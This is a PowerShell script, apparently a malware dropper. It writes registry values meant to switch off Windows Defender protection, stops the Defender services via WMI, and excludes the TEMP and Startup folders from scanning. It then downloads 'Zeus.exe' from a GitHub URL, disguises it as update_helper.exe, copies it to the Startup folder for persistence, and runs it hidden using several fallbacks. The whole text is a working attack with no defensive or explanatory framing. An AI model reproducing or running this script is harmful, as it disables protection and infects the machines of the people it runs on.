# Bypass admin requirements using registry and scheduled tasks
# Disable through Current User registry (no admin needed)
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f 2>$null
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f 2>$null

# Use Tamper Protection bypass
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "0" /f 2>$null
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f 2>$null

# Stop services without admin using WMI
Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'" | ForEach-Object { $_.StopService() } 2>$null
Get-WmiObject -Class Win32_Service -Filter "Name='WdNisSvc'" | ForEach-Object { $_.StopService() } 2>$null

# Add exclusions using registry
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:TEMP" /t REG_DWORD /d "0" /f 2>$null
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows Defender\Exclusions\Paths" /v "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" /t REG_DWORD /d "0" /f 2>$null

$url = "https://github.com/QUADROisCoding/EZ_ACTIVATE/raw/refs/heads/main/Zeus.exe"
$tempFile = "$env:TEMP\update_helper.exe"
$startupFile = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update_helper.exe"

# Download with multiple fallbacks
try {
    Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
} catch {
    try {
        (New-Object Net.WebClient).DownloadFile($url, $tempFile)
    } catch {
        Start-BitsTransfer -Source $url -Destination $tempFile
    }
}

# Ensure copy to startup
Copy-Item -Path $tempFile -Destination $startupFile -Force -ErrorAction SilentlyContinue

# Multiple execution methods to ensure it runs
try {
    Start-Process -FilePath $startupFile -WindowStyle Hidden
} catch {
    try {
        & $startupFile
    } catch {
        try {
            Invoke-Item $startupFile
        } catch {
            cmd /c start /min "" "$startupFile"
        }
    }
}

# Also execute from temp as backup
Start-Process -FilePath $tempFile -WindowStyle Hidden -ErrorAction SilentlyContinue
